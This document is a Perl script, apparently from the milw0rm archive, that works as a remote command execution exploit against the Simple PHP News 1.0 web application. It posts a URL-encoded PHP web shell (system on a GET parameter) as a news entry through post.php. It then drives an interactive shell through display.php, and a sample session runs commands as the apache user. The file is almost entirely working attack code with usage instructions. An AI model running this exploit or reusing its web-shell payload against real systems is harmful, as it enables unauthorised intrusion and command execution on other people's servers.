#!/usr/bin/perl

# -----------------------------------------------------------------------------
#                      INFORMATIONS
# -----------------------------------------------------------------------------

# App   => Simple PHP News 1.0 Final
# Downl => http://www.hotscripts.com/jump.php?listing_id=66376&jump_type=1

# Remote Command Execution Exploit
# by Osirys
# osirys[at]autistici[dot]org
# osirys.org
# Thx&Greets to: evilsocket

# A personal comment :  just bleah !!

# Tested with: Magic Quotes => Off

# ------------------------------------------------------------------
# Exploit in action [>!]
# ------------------------------------------------------------------
# osirys[~]>$ perl rce_lol.txt http://localhost/php_simple_news/

#   ---------------------------------
#      Simple PHP News RCE Exploit
#               by Osirys
#   ---------------------------------

# [*] Adding new evil news ..
# [*] RCE Created !
# [&] Hi my master, do your job now [!]

# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pwd
# /home/osirys/web/php_simple_news
# shell[localhost]$> exit
# [-] Quitting ..
# osirys[~]>$
# ------------------------------------------------------------------

use LWP::UserAgent;
use IO::Socket;
use HTTP::Request::Common;

my $post_pag  =  "/post.php";
my $rce_path  =  "/display.php";
my $rand = int(rand 99) +1;
my $host      =  $ARGV[0];


($host) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);

my $date = &date;
my $url = $path.$post_pag;

my $code = "title=Shout&date=".$date. "&post=%3C%3Fphp%0D%0Aecho+".
           "%22shoutZ0".$rand."%22%3B%0D%0Aif%28get_magic_quotes_".
           "gpc%28%29%29%7B%0D%0A+++%24_GET%5Bcmd%5D%3Dstripslash".
           "es%28%24_GET%5Bcmd%5D%29%3B%0D%0A%7D%0D%0Asystem%28%2".
           "4_GET%5Bcmd%5D%29%3B%0D%0Aecho+%22-0Ztuohs".$rand."%2".
           "2%3B%0D%0A%3F%3E";

my $length = length($code);

my $data = "POST ".$url." HTTP/1.1\r\n".
           "Host: ".$h0st."\r\n".
           "Keep-Alive: 300\r\n".
           "Connection: keep-alive\r\n".
           "Content-Type: application/x-www-form-urlencoded\r\n".
           "Content-Length: ".$length."\r\n\r\n".
           $code."\r\n";

my $socket   =  new IO::Socket::INET(
                                         PeerAddr => $h0st,
                                         PeerPort => '80',
                                         Proto    => 'tcp',
                                    ) or die "[-] Can't connect to $h0st:80\n[?] $! \n\n";

print "[*] Adding new evil news ..\n";
$socket->send($data);

while ((my $e = <$socket>)&&($own != 1)) {
    if ($e =~ /Entry added successfully/) {
        $own = 1;
        print "[*] RCE Created ! \n";
    }
}
$own == 1 || die "[-] Can't send new news !\n";

print "[&] Hi my master, do your job now [!]\n\n";
&exec_cmd;

sub exec_cmd {
    my(@outs,$out);
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    $exec_url = $host.$rce_path."?cmd=".$cmd;
    $re = get_req($exec_url);
    $content = tag($re);
    if ($content =~ /shoutZ0$rand(.*)-0Ztuohs$rand/) {
        $out = $1;
        @outs = split //, $out;
        foreach my $e(@outs) {
            $e =~ s/\*/\n/;
            print $e;
        }
        &exec_cmd;
    }
    elsif ($content =~ /shoutZ0$rand-0Ztuohs$rand/) {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }
}

sub date {
    my $year  = (localtime)[5] + 1900;
    my $month = (localtime)[4];
    my $day   = (localtime)[3];
    $month =~ s/([0-9]{1})/0$1/ if ($month =~ /[0-9]{1}/);
    $day   =~ s/([0-9]{1})/0$1/ if ($day =~ /[0-9]{1}/);
    my $date = $month."/".$day."/".$year;
    return($date);
}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/\n/\*/g;
    return($string);
}

sub banner {
    print "\n".
          "  --------------------------------- \n".
          "     Simple PHP News RCE Exploit    \n".
          "              by Osirys             \n".
          "  --------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Bad hostname! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}

# milw0rm.com [2009-02-06]